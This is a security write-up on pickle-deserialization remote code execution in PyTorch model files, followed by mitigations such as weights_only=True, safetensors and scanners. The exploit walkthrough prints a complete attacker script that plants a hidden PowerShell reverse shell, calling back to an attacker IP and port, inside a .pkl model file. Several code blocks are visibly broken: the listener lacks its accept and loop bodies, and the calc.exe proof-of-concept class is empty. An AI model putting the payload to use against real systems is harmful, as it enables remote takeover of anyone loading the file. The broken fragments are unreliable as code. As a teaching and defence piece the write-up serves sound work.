Background: Python Pickle Protocol

Python's pickle module implements a binary serialization protocol for converting arbitrary Python objects into byte streams and back. While powerful, it was never designed with security in mind — the Python documentation explicitly warns:

⚠ Official Python Docs Warning "The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling."

The core of the vulnerability lies in the __reduce__ dunder method. When Python deserializes a pickled object, it calls __reduce__ on that object to reconstruct it. This method returns a tuple of (callable, args) — and Python will call callable(*args) unconditionally during unpickling.

Python pickle_internals.py 
# How __reduce__ works internally during unpickling
# pickle opcode 0x52 (REDUCE) does essentially this:

def load_reduce(self):
    args = self.stack.pop()
    func = self.stack[-1]
    self.stack[-1] = func(*args)  # ← arbitrary code execution here

# If func = os.system and args = ("calc.exe",)
# then os.system("calc.exe") is called — no questions asked

There is no sandbox, no allowlist, no validation. Any callable reachable in the Python environment can be invoked with any arguments during deserialization.

Attack Surface: ML Model Distribution

The ML ecosystem has a significant supply chain problem. Model weights are routinely distributed as .pkl, .pt, or .bin files via:

  • Hugging Face Hub (millions of model files)
  • GitHub repositories
  • Academic paper supplementary materials
  • Internal model registries
  • Pip packages bundling pretrained weights

torch.load() uses pickle internally to deserialize model state dicts. Prior to PyTorch 2.6, the default behavior was to unpickle without restriction — meaning any downloaded model file was a potential RCE vector.

Technical Analysis

torch.save() / torch.load() Internals

torch.save() uses a ZIP-based format with a magic number header, but the actual tensor data and Python objects within it are serialized using pickle protocol 4. This means a valid-looking .pt file with the correct torch magic bytes can still contain a malicious pickle payload inside the ZIP container.

Python torch/serialization.py (simplified) 
# torch.load() internals (pre-2.6 default)
def _legacy_load(f, map_location, pickle_module, **kwargs):
    # Reads ZIP structure, finds pickle data
    unpickler = pickle_module.Unpickler(data_file)
    return unpickler.load()  # ← unrestricted unpickling

# torch.load() with weights_only=True (safe)
def _weights_only_unpickler(f):
    unpickler = _WeightsOnlyUnpickler(f)
    # Only allows: torch.Tensor, numpy arrays,
    # basic Python types (dict, list, int, str, float)
    # Raises on ANY other callable
    return unpickler.load()

The __reduce__ Contract

When pickle encounters an object during serialization, it calls __reduce__ to get reconstruction instructions. The return value can be:

Return TypeMeaningSecurity Impact
strGlobal name lookupMedium
(callable, args)Call callable(*args) on loadCRITICAL
(callable, args, state)+ setstate callCRITICAL
(callable, args, state, list_items, dict_items)Full reconstructionCRITICAL

For RCE, we return (os.system, ("malicious_command",)). During unpickling, pickle resolves os.system from the os module and calls it with our command string. This happens before any user code runs — purely as a side effect of loading the file.

Exploit Walkthrough

Stage 1: Payload Generation (Attacker)

The attacker creates a malicious class with __reduce__ returning a reverse shell command, then serializes it with torch.save() to produce a file with valid PyTorch magic bytes:

Python attacker_payload.py 
import pickle, os, torch

class MaliciousModel:
    ATTACKER_IP   = "192.168.0.180"
    ATTACKER_PORT = 4444

    def __reduce__(self):
        # This tuple is the deserialization bomb
        # pickle will call: os.system(cmd) on the VICTIM machine
        cmd = (
            f"powershell -ExecutionPolicy Bypass -nop -w hidden -c \""
            f"$c=New-Object Net.Sockets.TCPClient('{self.ATTACKER_IP}',{self.ATTACKER_PORT});"
            f"$s=$c.GetStream();"
            f"[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);"
            f"$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}\""
        )
        return os.system, (cmd,)
        # ↑ os.system(cmd) fires the moment victim calls torch.load()

# torch.save() wraps the pickle in a valid PyTorch ZIP container
# This bypasses naive "check for .pt extension" defenses
torch.save(MaliciousModel(), "model.pkl")
print("[+] Malicious model.pkl written")

Stage 2: Listener Setup (Attacker)

A custom Python listener provides an interactive session over the reverse shell connection:

import socket, threading

def receive(conn):

            data = conn.recv(4096).decode('utf-8', errors='ignore')
            if data: print(data, end='')

s = socket.socket()

threading.Thread(target=receive, args=(conn,), daemon=True).start()

while True:

Stage 3: Victim Triggers RCE

The victim downloads what they believe is a model file and loads it. The weights_only=False flag — required in older PyTorch versions or explicitly set by users following old tutorials — disables the safety check:

Python victim.py 
import torch

# Common pattern seen in countless tutorials and codebases
# This single line fires the attacker's __reduce__ payload
model = torch.load("model.pkl", weights_only=False)
#                                  ↑ disables safety — attacker wins

# No exception is raised. The "model" appears to load normally.
# Meanwhile, a reverse shell is connecting to 192.168.0.180:4444
🔴 Key Insight The exploit is silent. No exception is raised, no warning is printed. The model appears to load successfully. The reverse shell connection happens as a side effect invisible to the victim.

Demo: calc.exe Proof of Concept

For a benign demonstration proving arbitrary code execution, the payload can be reduced to a single line — launching calc.exe on the victim's Windows machine:

class CalcPoC:

Mitigations & Defense

weights_only=True

Always use torch.load(path, weights_only=True). Default since PyTorch 2.6. Allowlists only safe types: tensors, numpy arrays, basic Python primitives.

Scan Before Load

Use tools like picklescan or modelscan (by ProtectAI) to inspect pickle files for dangerous opcodes before loading.

Prefer SafeTensors

Use Hugging Face's safetensors format instead of .pkl/.pt. It stores only raw tensor data with no executable code path.

Verify Checksums

Verify SHA256 hashes of downloaded model files against publisher-provided checksums before loading. Never load unsigned model files in production.

Sandbox Loading

Load untrusted models inside Docker containers, VMs, or restricted environments with no network access and minimal filesystem permissions.

Upgrade PyTorch

PyTorch ≥ 2.6 sets weights_only=True as the default. Upgrade immediately. Audit any codebase explicitly passing weights_only=False.

Secure Loading Pattern

Python secure_load.py 
import torch
from safetensors.torch import load_file

# Option 1: weights_only=True (PyTorch ≥ 2.0)
model_state = torch.load("model.pt", weights_only=True)

# Option 2: safetensors format (recommended for distribution)
model_state = load_file("model.safetensors")

# Option 3: scan first, then load
from modelscan.scanner import ModelScan
scanner = ModelScan()
result = scanner.scan("model.pt")
if not result.issues_found:
    model_state = torch.load("model.pt", weights_only=True)

#  NEVER do this with untrusted files
# model = torch.load("model.pt", weights_only=False)
TL;DR Defense Upgrade to PyTorch ≥ 2.6, never pass weights_only=False on untrusted files, prefer safetensors format for model distribution, and scan with picklescan or modelscan in your CI/CD pipeline.

PyTorch Security Timeline

VersionDefault weights_onlyBehavior
< 2.0FalseFully unsafe — arbitrary pickle execution
2.0 – 2.5FalseWarning added, still unsafe by default
≥ 2.6True FIXEDSafe by default — allowlist only

The fix in 2.6 is a breaking change for users who rely on loading full Python objects (not just tensor weights) from .pt files. Such users must explicitly opt into weights_only=False — making the risk a deliberate, visible choice rather than a silent default.
